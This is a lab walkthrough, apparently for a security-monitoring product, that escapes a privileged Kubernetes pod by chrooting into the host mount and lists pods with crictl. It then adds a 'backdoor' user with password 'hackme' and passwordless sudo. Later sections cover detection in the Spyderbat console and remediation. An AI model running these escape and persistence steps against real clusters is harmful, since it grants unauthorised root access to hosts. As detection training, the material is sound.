# Container Escape Using Chroot

## Running the Exploit

> This exploit is based on <a href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers/welcome" target="_blank">a Kubernetes Goat scenario</a>, updated to be compatible with modern Kubernetes.

One of the assets we have added to the cluster is a system monitor that has more permissions than is really necessary. To start, use `kubectl exec` to access the container.

```sh
kubectl exec -it -n chroot $(kubectl get pods -n chroot -o jsonpath='{.items[0].metadata.name}') -- /bin/bash
```


Ideally, this shell is restricted to the container. However, running `mount` reveals that there is a link to the host system:

```sh
mount | grep 'host' | head
```

At the top of the mount entries, there is a `/host-system` folder that seems to link to the host machine.

```
tmpfs on /host-system type tmpfs (rw,relatime,size=7318352k)
# ...
```
```sh
ls /host-system/
```
```
CHANGELOG  bin  boot  data  dev  etc  home  hosthome  init  lib  lib64  libexec  linuxrc  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  version.json
```

Additionally, running `capsh` shows that we have the chroot permission, allowing us to change our root to act like we are in the host system:

```sh
capsh --print | grep chroot
```

```sh
chroot /host-system bash
```

Now, we are in the root of the host system, which gives us all kinds of access. For this exercise, let's take a look at the running pods and containers with `crictl`, then create persistence with a new user.

`crictl` is an alternative command-line control to docker that integrates with Kubernetes. To start, let's use it to list the available pods:

```sh
crictl pods
```

If you installed the Falco integration, you should see:

```
POD ID              CREATED             STATE               NAME                                         NAMESPACE           ATTEMPT             RUNTIME
...
3d7d82e569d3a       About an hour ago   Ready               falco-8tg8k                                  falco               3                   (default)
6d3463aca3379       About an hour ago   Ready               falco-falcosidekick-6f7996c855-s48w6         falco               3                   (default)
b7897f1847274       About an hour ago   Ready               falco-falcosidekick-6f7996c855-nfnd7         falco               3                   (default)
...
```

Let's look at the containers that are named Falco:

```sh
crictl ps --name falco
```
```
CONTAINER           IMAGE               CREATED             STATE               NAME                       ATTEMPT             POD ID              POD
0a86211354518       f26819a025370       About an hour ago   Running             falcoctl-artifact-follow   3                   3d7d82e569d3a       falco-8tg8k
a7e18aca478f0       5d7f6e3db4150       About an hour ago   Running             falco                      3                   3d7d82e569d3a       falco-8tg8k
1cc6683c7aee4       e3197d6b0c4c7       About an hour ago   Running             falcosidekick              3                   b7897f1847274       falco-falcosidekick-6f7996c855-nfnd7
2a6b72c464d75       e3197d6b0c4c7       About an hour ago   Running             falcosidekick              3                   6d3463aca3379       falco-falcosidekick-6f7996c855-s48w6
```

At this point, we could exec into one of these containers and investigate logs or API keys, but for now, let's move on to creating persistence. To do this, we will create a new user:

```sh
adduser backdoor
```
```
New password: hackme
Bad password: too weak
Retype password: hackme
passwd: password for backdoor changed by root
```

Next, we need to give the backdoor user permissions to use `sudo` so that they can get root access:

```sh
visudo
```

Move to the bottom of the file, press `o` to open a new line, then add the `backdoor` line like this:

```
root ALL=(ALL) ALL
%wheel ALL=(ALL) NOPASSWD: ALL
backdoor ALL=(ALL) NOPASSWD: ALL
```

Press Escape and type `:wq` to write and quit. Now, we can test our new user:

```sh
su - backdoor
sudo -l
```

```
User backdoor may run the following commands on system-monitor-deployment-5d49dd76b9-dmbqs:
    (ALL) NOPASSWD: ALL
```

From here, we could then install ssh keys for the backdoor user.

In summary, we gained access to a vulnerable Kubernetes container, then exploited its excessive access to gain root privileges on the host machine. From there, we were able to access the entire Kubernetes cluster on this node and create a backdoor user with root access for persistence.


## Investigating the Results

Performing this exploit will trigger a number of red flags which are detected and collected into a single Spydertrace object. In the Spyderbat Console, navigate to the Dashboard page. In the Security tab, under "Recent Spydertraces with Score > 50", a new trace should appear, likely named "root_shell", or "container_escape_using_chroot...". Expanding the group name should show that it has an extremely high score of over 200, indicating a large number of linked high-severity flags. Selecting this Spydertrace, we can select "Start Process Investigation" to see the events of the exploit layed out in a Causal Tree in the investigation view:

![A section of the Spydertrace featuring one of my chroot commands](./chroot_flag_graph.png)

Here, we can clearly see the interactive shell, running the `chroot` command, and later investigating with `crictl` and creating persistence with `adduser` and `visudo`.

## Next Steps

Now that the vulnerable container has been identified and the backdoor user found, steps can be taken to end the existing access, update the pod configuration to remove the possibility of a chroot, and remove the new user from the cluster host machine to prevent the attacker from regaining access.

